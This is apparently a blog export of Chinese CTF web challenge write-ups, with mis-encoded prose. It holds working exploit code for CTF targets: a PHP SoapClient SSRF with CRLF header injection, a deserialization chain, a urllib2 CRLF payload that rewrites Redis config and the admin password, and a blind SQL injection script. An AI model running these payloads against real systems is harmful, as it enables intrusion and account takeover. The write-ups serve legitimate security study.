<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $data = base64_decode($data);</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $l = strlen($key);</span><br><span class="line">    $char = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $l)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= substr($key, $x, <span class="number">1</span>);</span><br><span class="line">        $x++;</span><br><span class="line">    &#125;</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ord(substr($data, $i, <span class="number">1</span>)) &lt; ord(substr($char, $i, <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            $str .= chr((ord(substr($data, $i, <span class="number">1</span>)) + <span class="number">256</span>) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $str .= chr(ord(substr($data, $i, <span class="number">1</span>)) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> decrypt(<span class="string">"3J6Roahxaw=="</span>,<span class="string">"flag&#123;this_is_false_flag&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">xiaoC:<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>çŸ¥é“äº†æ ¼å¼å°±å¯ä»¥é€šè¿‡ç»™å‡ºçš„åŠ å¯†è„šæœ¬å’Œå¯†é’¥æ„é€ admin:1ï¼Œæ›¿æ¢cookieä»¥adminçš„èº«ä»½ç™»å½•äº†</p>
<p>åé¢çš„å†…å®¹è·Ÿç€wpåšçš„ï¼Œå¤ªèœäº†æƒ³ä¸åˆ°</p>
<p>å…ˆå†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç½‘é¡µ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://4895333f-5107-4410-aff4-4f630ea27904.node3.buuoj.cn/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå…ˆç”Ÿæˆä¸€ä¸ªSoapClient</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span> =&gt; <span class="string">"ha1c9on"</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»•åä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…è¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œè¦æ³¨æ„å¸¦ä¸ŠPHPSESSID</p>
<img src="/2020/07/14/SWPU2019web6/6.png" class="">

<p>ç„¶åå°±æ˜¯è¦ä¼ å…¥åºåˆ—åŒ–çš„æ•°æ®ï¼Œç»™å‡ºexp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> $mod3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> bb();</span><br><span class="line">$a = <span class="keyword">new</span> aa();</span><br><span class="line">$b-&gt;mod1 = $a;</span><br><span class="line">$c = <span class="keyword">new</span> cc();</span><br><span class="line">$a-&gt;mod2[<span class="string">'test2'</span>] = $c;</span><br><span class="line">$e = <span class="keyword">new</span> ee();</span><br><span class="line">$c-&gt;mod1 = $e;</span><br><span class="line">$d = <span class="keyword">new</span> dd();</span><br><span class="line">$e-&gt;str1 = $d;</span><br><span class="line">$e-&gt;str2 = <span class="string">'getflag'</span>;</span><br><span class="line">$d-&gt;flag = <span class="string">'Get_flag'</span>;</span><br><span class="line">$d-&gt;b = <span class="string">'call_user_func'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure>

<p>è®¿é—®se.phpé¡µé¢ï¼ŒæŠŠæ•°æ®ä¼ ç»™aaï¼Œå¸¦ä¸ŠPHPSESSID</p>
<img src="/2020/07/14/SWPU2019web6/7.png" class="">

<p>ç›¸å…³çŸ¥è¯†é“¾æ¥ï¼š</p>
<p><a href="https://blog.csdn.net/ljl890705/article/details/79142383" target="_blank" rel="noopener">https://blog.csdn.net/ljl890705/article/details/79142383</a></p>
<p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p>
<p><a href="https://xz.aliyun.com/t/3339" target="_blank" rel="noopener">https://xz.aliyun.com/t/3339</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
]]></content>
      <tags>
        <tag>SWPU</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF-2016-Web7</title>
    <url>/2020/07/27/SWPUCTF-2016-Web7/</url>
    <content><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul>
<li>urllib2.urlopen()ä¸æ”¯æŒgopheråè®®</li>
<li>urllib2.urlopen()æœªè€ƒè™‘æ¢è¡Œç¬¦</li>
<li>rediså†™æ•°æ®çš„æ–¹æ³•</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤ï¼š"><a href="#è§£é¢˜æ­¥éª¤ï¼š" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼š"></a>è§£é¢˜æ­¥éª¤ï¼š</h2><p>python2.7.5+redis2.6</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(self,url=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        file=open(<span class="string">"index.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">"url"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">"é”™è¯¯"</span>+str(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,password=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">""</span></span><br><span class="line">        file=open(<span class="string">"login.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            re=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">"password"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">"admin"</span>)==password:</span><br><span class="line">                re=open(<span class="string">"flag"</span>,<span class="string">'r'</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">"Can't find admin:"</span>+password+<span class="string">",fast fast fast....."</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">'server.socket_host'</span>: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">                        <span class="string">'server.socket_port'</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸Šé¢çš„ä»£ç ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬æœ‰ä¸¤ä¸ªè¾“å…¥çš„åœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¾“å…¥urlï¼Œurllib2.urlopen()ä¼šå¯¹æˆ‘ä»¬è¾“å…¥çš„urlè¿›è¡Œè®¿é—®ï¼Œå¦‚æœä¸ç¬¦åˆçš„è¯å°±ä¼šæŠ¥é”™ã€‚ç¬¬äºŒä¸ªå¯¹æ–¹å°±æ˜¯ç™»å½•æ£€éªŒï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸç™»å½•çš„è¯å°±ä¼šç»™åˆ°flagã€‚è¿™é‡Œåº”è¯¥æ˜¯è¦ssrf+redisäº†ï¼Œä½†æ˜¯æ³¨æ„åˆ°urllib2.open()ä¸æ”¯æŒgopheråè®®ï¼Œå°±æ‰“ä¸åˆ°redisã€‚æŸ¥èµ„æ–™æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://bugs.python.org/issue30458ï¼Œå€Ÿç”¨æ–‡ç« çš„ä¾‹å­ï¼Œurllib2.open()æ˜¯ä¸ä¼šå¤„ç†æ¢è¡Œç¬¦çš„" target="_blank" rel="noopener">https://bugs.python.org/issue30458ï¼Œå€Ÿç”¨æ–‡ç« çš„ä¾‹å­ï¼Œurllib2.open()æ˜¯ä¸ä¼šå¤„ç†æ¢è¡Œç¬¦çš„</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlopen(<span class="string">"http://localhost:8000/ HTTP/1.1\r\nHEADER: INJECTED\r\nIgnore:"</span>)</span><br><span class="line"></span><br><span class="line">Data sent to the server:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.bind((<span class="string">"localhost"</span>, <span class="number">8000</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.listen()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[conn, addr] = server.accept()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pprint(conn.recv(<span class="number">300</span>).splitlines(keepends=<span class="literal">True</span>))</span><br><span class="line">[<span class="string">b'GET / HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'HEADER: INJECTED\r\n'</span>,</span><br><span class="line"> <span class="string">b'Ignore: HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'Accept-Encoding: identity\r\n'</span>,</span><br><span class="line"> <span class="string">b'User-Agent: Python-urllib/3.5\r\n'</span>,</span><br><span class="line"> <span class="string">b'Connection: close\r\n'</span>,</span><br><span class="line"> <span class="string">b'Host: localhost:8000\r\n'</span>,</span><br><span class="line"> <span class="string">b'\r\n'</span>]</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™é‡Œç”¨æ¢è¡Œç¬¦ä¹Ÿå°±æ˜¯%0d%0a,æ’å…¥åˆ°æ­£å¸¸çš„urlä¸­å°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payloadï¼šhttp:&#x2F;&#x2F;127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379&#x2F;foo</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ‰“è¿‡å»ä¹‹åè¦å¿«é€Ÿç™»å½•ï¼Œå°±èƒ½æ‹¿åˆ°flagï¼Œå› ä¸ºåå°æœ‰è„šæœ¬åœ¨ä¸æ–­ä¿®æ”¹å¯†ç </p>
<img src="/2020/07/27/SWPUCTF-2016-Web7/1.png" class="">

<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/input"</span></span><br><span class="line">            data = &#123;<span class="string">'value'</span>: <span class="string">'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'</span>&#125;</span><br><span class="line">            requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/admin"</span></span><br><span class="line">            data = &#123;<span class="string">'passworld'</span>: <span class="string">'xx00'</span>&#125;</span><br><span class="line">            text = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test2)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    i.join()</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul>
<li><a href="https://www.anquanke.com/post/id/84814" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84814</a></li>
<li><a href="https://bugs.python.org/issue30458" target="_blank" rel="noopener">https://bugs.python.org/issue30458</a></li>
</ul>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>WHUCTF</title>
    <url>/2020/05/25/WHUCTF/</url>
    <content><![CDATA[<h4 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h4><a id="more"></a>

<p>é¢˜ç›®æ‰“å¼€æ˜¯ä¸ªç™»å½•æ¡†ï¼Œæ ¹æ®é¢˜ç›®åº”è¯¥å°±æ˜¯sqlæ³¨å…¥ï¼Œä¸‡èƒ½å¯†é’¥ç™»å½•ï¼Œå¼¹çª—æ˜¾ç¤ºç™»å½•æˆåŠŸï¼Œæ— å…¶ä»–å›æ˜¾ï¼Œåˆ¤æ–­æ˜¯ç›²æ³¨</p>
<p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†orã€selectç­‰ï¼ŒåŒå†™ç»•è¿‡æˆåŠŸï¼Œç›´æ¥è´´è„šæœ¬å§ï¼ˆç¬¬ä¸€æ¬¡è‡ªå·±æ‰‹å†™çš„è„šæœ¬ï¼ŒçœŸçš„æ˜¯å¾ˆå–œæ‚¦äº†ï¼Œè™½ç„¶æ²¡æœ‰äºŒåˆ†æ³•å¿«ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i, ord(j))</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨äºŒåˆ†æ³•ä¼šå¾ˆå¿«ï¼Œè€Œä¸”ç”¨äºŒåˆ†æ³•å¯ä»¥ä¸ç”¨è€ƒè™‘ç‰¹æ®Šå­—ç¬¦ï¼Œéƒ½åŒ…å«åœ¨é‡Œé¢äº†ï¼ŒæŠ½æ—¶é—´å†™ä¸€ä¸ªäºŒåˆ†æ³•çš„ç›²æ³¨è½®å­</p>
<h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œåœ¨contacté¡µé¢å‘ç°æœ‰æäº¤æ¡†ï¼ŒçŒœæµ‹åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œï¼Œéšä¾¿å†™å†™æäº¤ï¼ŒF12ï¼Œå‘ç°ç‚¹æç¤º</p>
<img src="/2020/05/25/WHUCTF/1.png" class="">

<p>è„‘æ´ï¼Œä¸€æ—¶ä¹‹é—´æƒ³ä¸åˆ°åŠæ³•ï¼Œæ— æ„å¤šåˆ·æ–°äº†å‡ æ¬¡ï¼Œå‘ç°è„šæ³¨é‚£é‡Œçš„å†…å®¹ä¼šæ”¹å˜ï¼ŒçŒœæµ‹getç‚¹æœ‰éšè—çš„å‚æ•°æ²¡æœ‰æ˜¾ç¤ºï¼Œæ ¹æ®ä»¥å¾€çš„ç»éªŒï¼Œï¼Œä¸€èˆ¬æ–‡ä»¶åŒ…å«çš„å‚æ•°éƒ½ä¼šæ˜¯fileï¼ŒçŒœæµ‹å°è¯•ï¼ŒæˆåŠŸ</p>
<img src="/2020/05/25/WHUCTF/2.png" class="">

<p>ä¸‹é¢å°±æ˜¯ç”¨phpä¼ªåè®®è¯»å–ï¼Œè¿™é‡Œç›´æ¥å°è¯•è¯»å–flag.php</p>
<img src="/2020/05/25/WHUCTF/3.png" class="">

<h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>å¼€é¢˜ï¼Œç»™æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'ä¼šä»£ç å®¡è®¡å˜›23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ­¥ç”¨%0aå³å¯ç»•è¿‡ï¼Œå¾ˆç†Ÿæ‚‰äº†</p>
